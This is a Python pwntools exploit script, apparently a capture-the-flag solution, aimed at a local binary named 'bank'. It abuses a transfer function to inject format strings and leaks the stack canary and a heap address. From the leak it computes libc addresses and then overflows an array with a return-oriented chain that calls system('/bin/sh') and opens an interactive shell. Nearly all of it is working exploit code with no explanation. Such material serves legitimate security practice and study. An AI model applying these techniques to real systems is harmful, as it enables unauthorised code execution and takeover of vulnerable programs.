#!/bin/python
from pwn import *
exe = ELF('./bank')
p = process(exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''
           b*main+130
           c
           c
           c
           c
           c
           ''')
### $rbp-0x898 : where the idx_1 is  
### $rbp-0x890 : where the s[128] is 
### $rbp-0x810: where the total is
### $rbp-0x8A0: where the idx_in is 
#################exploiting#####################
idx = 258
#
# p.sendlineafter(b'n: ',b'258')
# input()
# for i in range(0, idx):
#     p.sendlineafter(b'Money: ', b'1000')



#####delete 8 strs '-' from array####### 
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'from: ',b'253')
p.sendlineafter(b'to: ',b'255')
p.sendlineafter(b'Money: ',b'3255307777713450285')
###########replace with format string##############
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'from: ',b'255')
p.sendlineafter(b'to: ',b'253')
p.sendlineafter(b'Money: ',b'123300780454437')
##############canary collecting process################
p.recvuntil(b'-'*104)
canary_leak = int(p.recvline().split(b'1)')[0],16)
log.info(f'canary_leak: ' + hex(canary_leak))
###############canary_leaking completed#####################

############## delete the previous format string#############
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'from: ',b'253')
p.sendlineafter(b'to: ',b'255')
p.sendlineafter(b'Money: ',b'123300780454437')
##################replace with new format string############
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'from: ',b'255')
p.sendlineafter(b'to: ',b'253')
p.sendlineafter(b'Money: ',b'123300814008869')
####################heap collecting process######################
p.recvuntil(b'-'*104)
heap_leak = int(p.recvline().split(b'1)')[0],16)
log.info(f'heap_leak: ' + hex(heap_leak))
############# heap leaking completed#####################

###########################################################
libc_base = heap_leak - 163024 
log.info(f'libc_base: ' + hex(libc_base))
pop_rdi=libc_base + 0x0000000000028265
log.info(f'pop_rdi: ' + hex(pop_rdi))
libc_system = libc_base + 325472
log.info(f'libc_system: ' + hex(libc_system))
bin_sh_libc = libc_base + 1682996 
log.info(f'bin_sh_libc: ' + hex(bin_sh_libc))
ret = libc_base + 2131208
############### writing process#####################
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'n: ',b'263')
for i in range(0, 257):
    p.sendlineafter(b'Money: ', b'100000')
p.sendlineafter(b'Money: ', str(canary_leak).encode())
p.sendlineafter(b'Money: ', str(0).encode())
p.sendlineafter(b'Money: ', str(ret).encode())
p.sendlineafter(b'Money: ', str(pop_rdi).encode())
p.sendlineafter(b'Money: ', str(bin_sh_libc).encode())
p.sendlineafter(b'Money: ', str(libc_system).encode())
p.sendlineafter(b'> ', b'3')
##############the end###########################
p.interactive()
